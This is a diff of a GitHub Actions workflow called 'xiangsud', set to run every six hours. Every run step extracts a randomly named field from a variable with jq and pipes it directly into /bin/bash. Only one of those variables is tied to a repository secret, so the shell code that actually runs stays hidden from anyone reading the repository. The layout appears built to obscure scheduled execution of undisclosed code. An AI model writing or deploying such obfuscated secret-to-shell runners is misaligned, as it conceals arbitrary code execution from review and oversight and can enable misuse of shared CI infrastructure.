@@ -2,22 +2,26 @@ name: xiangsud
 on:
   workflow_dispatch:
   schedule:
-    - cron: '29 2/6 * * *'
+    - cron: '41 2/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: xiangsud
         env:
-          zf86: ${{ secrets.zf86 }}
+          pol01507: ${{ secrets.pol01507 }}
         run: |
-          echo $zf86 | jq -r .fkuwb69583 | /bin/bash
-          echo $hh9197 | jq -r .m37217 | /bin/bash
-          echo $oef2887 | jq -r .nq9481 | /bin/bash
-          echo $cna67 | jq -r .xp9 | /bin/bash
-          echo $w52443 | jq -r .acaxv98627 | /bin/bash
-          echo $ddtzo48528 | jq -r .t39 | /bin/bash
-          echo $q030 | jq -r .vtam321 | /bin/bash
+          echo $pol01507 | jq -r .djupx8 | /bin/bash
+          echo $tkx81 | jq -r .ltcg47 | /bin/bash
+          echo $zwyx9949 | jq -r .szrx90 | /bin/bash
+          echo $ub227 | jq -r .st95117 | /bin/bash
+          echo $prch39953 | jq -r .vpq9786 | /bin/bash
+          echo $s24 | jq -r .h561 | /bin/bash
+          echo $w7 | jq -r .ql080 | /bin/bash
+          echo $ggi66387 | jq -r .fjnjx4 | /bin/bash
+          echo $mwiv72 | jq -r .venl14726 | /bin/bash
+          echo $ijnjv65859 | jq -r .j9265 | /bin/bash
 
